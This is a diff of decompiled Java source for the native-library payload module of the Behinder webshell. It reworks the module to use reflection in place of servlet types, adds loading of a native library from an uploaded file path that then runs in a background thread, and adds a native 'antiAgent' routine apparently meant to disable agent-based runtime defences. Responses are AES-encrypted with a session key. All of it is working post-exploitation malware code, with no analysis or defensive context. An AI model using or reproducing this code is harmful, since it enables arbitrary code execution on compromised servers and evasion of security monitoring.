@@ -1,8 +1,12 @@
 package net.rebeyond.behinder.payload.java;
 
+import java.io.ByteArrayOutputStream;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.FileOutputStream;
+import java.lang.reflect.Method;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.List;
@@ -10,10 +14,6 @@ import java.util.Map;
 import java.util.UUID;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
-import javax.servlet.ServletOutputStream;
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
-import javax.servlet.http.HttpSession;
 
 public class LoadNativeLibrary implements Runnable {
    public static String whatever;
@@ -21,119 +21,65 @@ public class LoadNativeLibrary implements Runnable {
    public static String fileContent;
    public static String payload;
    public static String filePath;
-   private ServletRequest Request;
-   private ServletResponse Response;
-   private HttpSession Session;
-   private String libraryPath;
+   public static String uploadLibPath;
+   private Object Request;
+   private Object Response;
+   private Object Session;
+   private String nativeLibPath;
 
    public boolean equals(Object obj) {
       HashMap result = new HashMap();
-      boolean var21 = false;
+      boolean var13 = false;
 
-      ServletOutputStream so = null;
-      label208: {
+      Object so;
+      Method write;
+      label77: {
          try {
-            var21 = true;
+            var13 = true;
             this.fillContext(obj);
-            if (action.equals("test")) {
-               try {
-                  System.load("c:/web/JavaNative.dll");
-                  this.freeFile("test");
-               } catch (Exception var45) {
-               } catch (Error var46) {
-               } finally {
-                  ;
-               }
-            }
-
-            if (action.equals("load")) {
-               try {
-                  this.loadLibrary(this.base64decode(fileContent));
-                  result.put("status", "success");
-                  result.put("msg", "Native库加载成功");
-                  var21 = false;
-               } catch (Exception var43) {
-                  result.put("status", "fail");
-                  result.put("msg", "Native库加载失败：" + var43.getMessage());
-                  var21 = false;
-               } catch (Error var44) {
-                  result.put("status", "fail");
-                  result.put("msg", "Native库加载失败：" + var44.getMessage());
-                  var21 = false;
-               }
-            } else {
-               String libraryPath;
-               if (action.equals("execute")) {
-                  try {
-                     System.gc();
-                     libraryPath = this.loadLibrary(this.base64decode(fileContent));
-                     (new Thread(new LoadNativeLibrary(libraryPath))).start();
-                     result.put("status", "success");
-                     result.put("msg", "Payload加载成功");
-                     var21 = false;
-                  } catch (Exception var41) {
-                     result.put("status", "fail");
-                     result.put("msg", "Payload加载异常：" + var41.getMessage());
-                     var21 = false;
-                  } catch (Error var42) {
-                     result.put("status", "fail");
-                     result.put("msg", "Payload加载错误：" + var42.getMessage());
-                     var21 = false;
-                  }
-               } else if (action.equals("freeFile")) {
-                  try {
-                     System.gc();
-                     libraryPath = this.loadLibrary(this.base64decode(fileContent));
-                     (new Thread(new LoadNativeLibrary(libraryPath))).start();
-                     result.put("status", "success");
-                     result.put("msg", "Payload加载成功");
-                     var21 = false;
-                  } catch (Exception var39) {
-                     result.put("status", "fail");
-                     result.put("msg", "Payload加载异常：" + var39.getMessage());
-                     var21 = false;
-                  } catch (Error var40) {
-                     result.put("status", "fail");
-                     result.put("msg", "Payload加载错误：" + var40.getMessage());
-                     var21 = false;
-                  }
-               } else {
-                  var21 = false;
-               }
-            }
-            break label208;
-         } catch (Exception var48) {
-            var21 = false;
+            String libraryPath = this.loadLibrary(getFileData(uploadLibPath));
+            (new Thread(new LoadNativeLibrary(libraryPath))).start();
+            result.put("status", "success");
+            result.put("msg", "Payload加载成功");
+            var13 = false;
+            break label77;
+         } catch (Exception var17) {
+            result.put("status", "fail");
+            result.put("msg", "Payload加载错误：" + var17.getMessage());
+            var13 = false;
          } finally {
-            if (var21) {
+            if (var13) {
                try {
-                  so = this.Response.getOutputStream();
-                  so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-                  so.flush();
-                  so.close();
-               } catch (Exception var36) {
+                  so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+                  write = so.getClass().getDeclaredMethod("write", byte[].class);
+                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+                  so.getClass().getDeclaredMethod("flush").invoke(so);
+                  so.getClass().getDeclaredMethod("close").invoke(so);
+               } catch (Exception var14) {
                }
 
             }
          }
 
          try {
-            so = this.Response.getOutputStream();
-            so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-            so.flush();
-            so.close();
-         } catch (Exception var37) {
+            so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+            write = so.getClass().getDeclaredMethod("write", byte[].class);
+            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+            so.getClass().getDeclaredMethod("flush").invoke(so);
+            so.getClass().getDeclaredMethod("close").invoke(so);
+         } catch (Exception var15) {
          }
 
          return true;
       }
 
       try {
-         so = this.Response.getOutputStream();
-         so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-         so.flush();
-         so.close();
-      } catch (Exception var38) {
+         so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+         write = so.getClass().getDeclaredMethod("write", byte[].class);
+         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+         so.getClass().getDeclaredMethod("flush").invoke(so);
+         so.getClass().getDeclaredMethod("close").invoke(so);
+      } catch (Exception var16) {
       }
 
       return true;
@@ -149,12 +95,12 @@ public class LoadNativeLibrary implements Runnable {
       String tempDir = System.getProperty("java.io.tmpdir");
       File library = new File(tempDir + File.separator + libPrefix + libSuffix);
       library.deleteOnExit();
-      if (this.Session.getAttribute("nativeLibs") == null) {
+      if (this.sessionGetAttribute(this.Session, "nativeLibs") == null) {
          List libs = new ArrayList();
          libs.add(library.getAbsolutePath());
-         this.Session.setAttribute("nativeLibs", libs);
+         this.sessionSetAttribute(this.Session, "nativeLibs", libs);
       } else {
-         List libs = (List)this.Session.getAttribute("nativeLibs");
+         List libs = (List)this.sessionGetAttribute(this.Session, "nativeLibs");
          Iterator var7 = libs.iterator();
 
          while(var7.hasNext()) {
@@ -173,14 +119,37 @@ public class LoadNativeLibrary implements Runnable {
       return library.getAbsolutePath();
    }
 
+   public String loadLibrary(String libraryPath) throws Exception {
+      File library = new File(libraryPath);
+      library.deleteOnExit();
+      if (this.sessionGetAttribute(this.Session, "nativeLibs") == null) {
+         List libs = new ArrayList();
+         libs.add(library.getAbsolutePath());
+         this.sessionSetAttribute(this.Session, "nativeLibs", libs);
+      } else {
+         List libs = (List)this.sessionGetAttribute(this.Session, "nativeLibs");
+         Iterator var4 = libs.iterator();
+
+         while(var4.hasNext()) {
+            String libPath = (String)var4.next();
+            (new File(libPath)).delete();
+         }
+
+         libs.add(library.getAbsolutePath());
+      }
+
+      System.load(library.getAbsolutePath());
+      return library.getAbsolutePath();
+   }
+
    public void execute(byte[] payload) {
    }
 
    public LoadNativeLibrary() {
    }
 
-   public LoadNativeLibrary(String libraryPath) {
-      this.libraryPath = libraryPath;
+   public LoadNativeLibrary(String nativeLibPath) {
+      this.nativeLibPath = nativeLibPath;
    }
 
    public void run() {
@@ -193,11 +162,14 @@ public class LoadNativeLibrary implements Runnable {
             libFile.delete();
          } else if (action.equals("execute")) {
             this.load(this.base64decode(payload));
+         } else if (action.equals("antiAgent")) {
+            this.antiAgent();
          }
       } catch (Exception var11) {
+         var11.printStackTrace();
       } finally {
          if (this.isWindows()) {
-            this.selfUnload(this.libraryPath);
+            this.selfUnload(this.nativeLibPath);
          }
 
          try {
@@ -205,7 +177,7 @@ public class LoadNativeLibrary implements Runnable {
          } catch (InterruptedException var10) {
          }
 
-         (new File(this.libraryPath)).delete();
+         (new File(this.nativeLibPath)).delete();
       }
 
    }
@@ -218,8 +190,10 @@ public class LoadNativeLibrary implements Runnable {
 
    public native void selfUnload(String var1);
 
+   public native void antiAgent();
+
    private byte[] Encrypt(byte[] bs) throws Exception {
-      String key = this.Session.getAttribute("u").toString();
+      String key = this.Session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
       byte[] raw = key.getBytes("utf-8");
       SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
@@ -310,16 +284,55 @@ public class LoadNativeLibrary implements Runnable {
 
    private void fillContext(Object obj) throws Exception {
       if (obj.getClass().getName().indexOf("PageContext") >= 0) {
-         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
-         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
-         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+         this.Request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+         this.Response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
+         this.Session = obj.getClass().getDeclaredMethod("getSession").invoke(obj);
       } else {
          Map objMap = (Map)obj;
-         this.Session = (HttpSession)objMap.get("session");
-         this.Response = (ServletResponse)objMap.get("response");
-         this.Request = (ServletRequest)objMap.get("request");
+         this.Session = objMap.get("session");
+         this.Response = objMap.get("response");
+         this.Request = objMap.get("request");
       }
 
-      this.Response.setCharacterEncoding("UTF-8");
+      this.Response.getClass().getDeclaredMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
+   }
+
+   private Object sessionGetAttribute(Object session, String key) {
+      Object result = null;
+
+      try {
+         result = session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(session, key);
+      } catch (Exception var5) {
+      }
+
+      return result;
+   }
+
+   private void sessionSetAttribute(Object session, String key, Object value) {
+      try {
+         session.getClass().getDeclaredMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
+      } catch (Exception var5) {
+      }
+
+   }
+
+   public static byte[] getFileData(String filePath) throws Exception {
+      byte[] fileContent = new byte[0];
+      FileInputStream fis = new FileInputStream(new File(filePath));
+      byte[] buffer = new byte[10240000];
+
+      int length;
+      for(boolean var4 = false; (length = fis.read(buffer)) > 0; fileContent = mergeBytes(fileContent, Arrays.copyOfRange(buffer, 0, length))) {
+      }
+
+      fis.close();
+      return fileContent;
+   }
+
+   public static byte[] mergeBytes(byte[] a, byte[] b) throws Exception {
+      ByteArrayOutputStream output = new ByteArrayOutputStream();
+      output.write(a);
+      output.write(b);
+      return output.toByteArray();
    }
 }
